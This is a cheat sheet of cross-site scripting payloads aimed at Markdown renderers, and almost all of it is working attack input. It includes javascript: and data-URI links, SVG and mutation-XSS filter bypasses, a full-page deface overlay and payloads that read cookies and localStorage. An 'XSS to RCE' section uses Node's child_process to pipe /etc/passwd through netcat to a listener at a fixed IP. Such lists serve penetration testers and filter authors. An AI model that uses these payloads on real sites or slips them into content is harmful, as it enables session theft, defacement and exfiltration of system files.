``[ ](http://a?p=[[/onclick=alert(0) .]])``

Deface:

```
[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
```

```
</xss://<\div\ style=\"font-size:24px;background:red;color:red;width:50%;height:48px;line-height:48px;text-align:center;x:expression(alert(1));/\">>Hackerone
```

```language
%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
```

If have form to create:
https://hackerone.com/reports/526325

Markdown SVG filter bypass:

```
<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```
```
<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javaScriPt://www.simplenote.com/test%0aalert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```

XSS via exploiting URL:

```
[url=google.com:/onclick='alert(document.domain)'[url=]]xss[/url]
```

-------
- While editing a markdown file, select some text and click the "Add Link" button.
- Using a web proxy, intercept the request and change the href value to javascript:alert(1).
-------

```
Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
```

```
<noscript><p title="</noscript><img src=x onerror=alert(1)><img src=x onerror=alert(1)>
```

Mutation XSS:
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

```
<noscript> <p title="</noscript><img src=x onerror=alert(1)>">**</p> </noscript>
```

```
<noscript><p title="</noscript> <img src="x" onerror="alert(1)"> ""> "
```

```

<blockquote>
 <p>test <a name="n"
 href="javascript:alert('xss')"><em>xss</em></a></p>
</blockquote>

test <a name="n" href="javascript:alert('xss')">*xss*</a>

```

XSS to RCE:

add this to md and listen on `nc -l -p 1337 > passwd.txt`

```
<s <onmouseover="alert(1)"><s onmouseover="constexec=require('child_process').exec; exec('nc -w 3 192.168.8.100 1337 < /etc/passwd',(e, stdout, stderr)=> {if (e instanceof Error) {console.error(e);throw e;}console.log('stdout ', stdout);console.log('stderr ',stderr); });alert('1')">Hallo</s>
```

```
<video autoplay onloadstart="alert()" src=x></video>
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src=x></video>
<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
```

# Basic tests
```
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')

```

```
![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
![Escape SRC - onerror]("onerror="alert('ImageOnError'))

```

```
[XSS](javascript:prompt(document.cookie))
[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
[XSS]: (javascript:prompt(document.cookie))
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0aprompt(1))
[XSS](javascript://%0d%0aprompt(1);com)
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](vbscript:alert(document.domain))
[XSS](javascript:this;alert(1))
[XSS](javascript:this;alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
[XSS](Javas%26%2399;ript:alert(1&#41;)
[XSS](javascript:alert&#65534;(1&#41;)
[XSS](javascript:confirm(1)
[XSS](javascript://www.google.com%0Aprompt(1))
[XSS](javascript://%0d%0aconfirm(1);com)
[XSS](javascript:window.onerror=confirm;throw%201)
[XSS](�javascript:alert(document.domain&#41;)
![XSS](javascript:prompt(document.cookie))\
![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
![XSS'"`onerror=prompt(document.cookie)](x)\

```